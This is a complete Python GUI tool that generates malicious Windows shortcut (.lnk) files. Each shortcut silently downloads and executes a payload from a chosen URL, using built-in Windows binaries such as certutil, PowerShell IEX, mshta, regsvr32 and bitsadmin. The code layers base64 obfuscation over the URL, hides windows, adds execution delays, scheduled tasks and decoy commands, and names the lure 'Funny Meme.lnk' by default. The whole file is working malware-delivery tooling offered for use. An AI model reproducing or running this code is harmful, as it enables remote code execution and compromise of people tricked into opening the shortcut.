import os
import random
import base64
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import winshell
import pythoncom
from win32com.client import Dispatch
from datetime import datetime, timedelta

def multi_encode(data, layers=3):
    encoded = data.encode()
    for _ in range(layers):
        encoded = base64.b64encode(encoded)
    return encoded.decode()

def obfuscate_string(s):
    chunks = []
    i = 0
    while i < len(s):
        chunk_size = random.randint(4, 8)
        chunks.append(f'"{s[i:i+chunk_size]}"')
        i += chunk_size
    return ' + '.join(chunks)

def get_lolbas_methods(url, filepath):
    encoded_url = multi_encode(url)
    encoded_filepath = multi_encode(filepath)

    obf_url = obfuscate_string(encoded_url)
    obf_fp = obfuscate_string(encoded_filepath)

    decode_url = (
        f"$u=[System.Text.Encoding]::UTF8.GetString("
        f"[System.Convert]::FromBase64String("
        f"[System.Text.Encoding]::UTF8.GetString("
        f"[System.Convert]::FromBase64String("
        f"[System.Text.Encoding]::UTF8.GetString("
        f"[System.Convert]::FromBase64String({obf_url}))))))"
    )

    decode_fp = (
        f"$f=[System.Text.Encoding]::UTF8.GetString("
        f"[System.Convert]::FromBase64String("
        f"[System.Text.Encoding]::UTF8.GetString("
        f"[System.Convert]::FromBase64String("
        f"[System.Text.Encoding]::UTF8.GetString("
        f"[System.Convert]::FromBase64String({obf_fp}))))))"
    )

    ps_download = f"{decode_url};{decode_fp};Invoke-WebRequest $u -OutFile $f; Start-Process $f"

    return {
        "certutil": f'certutil -urlcache -split -f "{url}" "{filepath}"',
        "powershell": f'powershell -WindowStyle Hidden -Command "{ps_download}"',
        "mshta": f'mshta vbscript:Execute("CreateObject(\\"Wscript.Shell\\").Run \\"powershell -WindowStyle Hidden -Command {ps_download}\\",0")',
        "bitsadmin": f'bitsadmin /transfer myDownloadJob /download /priority high {url} {filepath}',
        "iex": f'powershell -WindowStyle Hidden -Command "{decode_url};IEX (New-Object Net.WebClient).DownloadString($u)"',
        "regsvr32": f'regsvr32 /s /n /u /i:{url} scrobj.dll',
        "rundll32": f'rundll32 url.dll,FileProtocolHandler {url}',
        "wmic": f'wmic process call create "powershell -WindowStyle Hidden -Command {ps_download}"',
        "installutil": f'installutil /logfile= /LogToConsole=false /U {filepath}',
        "scriptrunner": f'scriptrunner.exe -appvscript {filepath}',
        "msiexec": f'msiexec /q /i {url}',
        "forfiles": f'forfiles /p C:\\ /m *.exe /c "cmd /c powershell -WindowStyle Hidden -Command {ps_download}"',
        "curl": f'curl -o "{filepath}" "{url}"',
        "wget": f'wget "{url}" -O "{filepath}"',
        "explorer": f'explorer "{url}"',
        "desktopimgdownldr": f'desktopimgdownldr.exe /url:{url} /output:{filepath}'
    }

class LnkGeneratorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("LOLBAS .lnk Generator (uwu)")
        self.root.geometry("720x850")
        self.root.resizable(False, False)

        self.url_var = tk.StringVar()
        self.method_var = tk.StringVar()
        self.stealth_var = tk.BooleanVar()
        self.delay_var = tk.BooleanVar()
        self.schedule_var = tk.BooleanVar()
        self.decoy_var = tk.BooleanVar()
        self.decoy_count_var = tk.IntVar(value=3)
        self.output_name_var = tk.StringVar(value="Funny Meme.lnk")

        self.create_widgets()
        self.url_var.trace_add("write", lambda *args: self.update_methods())
        self.update_methods()  # Ensure dropdown is populated on startup

    def create_widgets(self):
        tk.Label(self.root, text="Enter Payload URL For Method (e.g. http://example.com:22/payload.bat):", font=("Arial", 12)).pack(pady=10)
        tk.Entry(self.root, textvariable=self.url_var, width=60).pack(pady=5)

        tk.Label(self.root, text="Select LOLBAS method:", font=("Arial", 12)).pack(pady=10)
        self.method_menu = ttk.Combobox(self.root, textvariable=self.method_var, state="readonly")
        self.method_menu.pack(pady=5)

        tk.Checkbutton(self.root, text="Enable stealth mode (hidden window)", variable=self.stealth_var).pack(pady=5)
        tk.Checkbutton(self.root, text="Add 1-hour delay before execution", variable=self.delay_var).pack(pady=5)
        tk.Checkbutton(self.root, text="Use Windows Task Scheduler", variable=self.schedule_var).pack(pady=5)

        tk.Checkbutton(self.root, text="Add decoy commands", variable=self.decoy_var).pack(pady=5)
        tk.Label(self.root, text="Number of decoy commands:").pack()
        tk.Spinbox(self.root, from_=1, to=10, textvariable=self.decoy_count_var, width=5).pack()

        tk.Label(self.root, text="Shortcut Output Name:", font=("Arial", 12)).pack(pady=10)
        tk.Entry(self.root, textvariable=self.output_name_var, width=40).pack(pady=5)

        tk.Button(self.root, text="Generate .lnk Shortcut", command=self.generate_shortcut, bg="#4CAF50", fg="white", font=("Arial", 12)).pack(pady=20)

        self.status_label = tk.Label(self.root, text="", font=("Arial", 10), fg="blue")
        self.status_label.pack(pady=10)

    def update_methods(self):
        url = self.url_var.get().strip()
        if not url or not url.startswith("http"):
            self.method_menu["values"] = []
            self.method_var.set("")
            return

        filename = os.path.basename(url)
        dummy_path = os.path.join(winshell.desktop(), filename)
        methods = get_lolbas_methods(url, dummy_path)

        if methods:
            method_list = list(methods.keys())
            self.method_menu["values"] = method_list
            if not self.method_var.get() or self.method_var.get() not in method_list:
                self.method_var.set(method_list[0])
        else:
            self.method_menu["values"] = []
            self.method_var.set("")

    def generate_shortcut(self):
        self.update_methods()  # Ensure latest method list is used

        url = self.url_var.get().strip()
        method = self.method_var.get()
        stealth = self.stealth_var.get()
        delay = self.delay_var.get()
        schedule = self.schedule_var.get()
        use_decoys = self.decoy_var.get()
        decoy_count = self.decoy_count_var.get()
        output_name = self.output_name_var.get().strip() or "Funny Meme.lnk"

        if not url or not method:
            messagebox.showerror("Error", "Please enter a valid URL and select a method.")
            return

        filename = os.path.basename(url)
        filepath = os.path.join(winshell.desktop(), filename)

        try:
            methods = get_lolbas_methods(url, filepath)
            chosen_cmd = methods.get(method)

            if not chosen_cmd:
                messagebox.showerror("Error", "Selected method is not available.")
                return

            cmd_parts = []

            if delay:
                cmd_parts.append("timeout /t 3600 >nul")

            if use_decoys:
                decoys = ["ping 127.0.0.1 -n 2 >nul", "dir", "echo Running...", "ver", "whoami"]
                for _ in range(decoy_count):
                    cmd_parts.append(random.choice(decoys))
                    cmd_parts.append("timeout /t 2 >nul")

            cmd_to_run = f'start "" /min cmd /c "{chosen_cmd}"' if stealth else chosen_cmd
            cmd_parts.append(cmd_to_run)

            final_cmd = " && ".join(cmd_parts)

            if schedule:
                task_name = f"Task{random.randint(1000,9999)}"
                run_time = (datetime.now() + timedelta(minutes=1)).strftime("%H:%M")
                final_cmd = (
                    f'schtasks /create /tn "{task_name}" /tr "cmd.exe /c {final_cmd}" '
                    f'/sc once /st {run_time} /f && schtasks /run /tn "{task_name}"'
                )

            shortcut_path = filedialog.asksaveasfilename(
                defaultextension=".lnk",
                initialfile=output_name,
                filetypes=[("Shortcut", "*.lnk")]
            )
            if not shortcut_path:
                return

            pythoncom.CoInitialize()
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = "cmd.exe"
            shortcut.Arguments = f'/c {final_cmd}'
            shortcut.WorkingDirectory = "C:\\"
            shortcut.IconLocation = "cmd.exe"
            shortcut.save()

            self.status_label.config(text=f"Shortcut created at: {shortcut_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create shortcut: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = LnkGeneratorApp(root)
    root.mainloop()
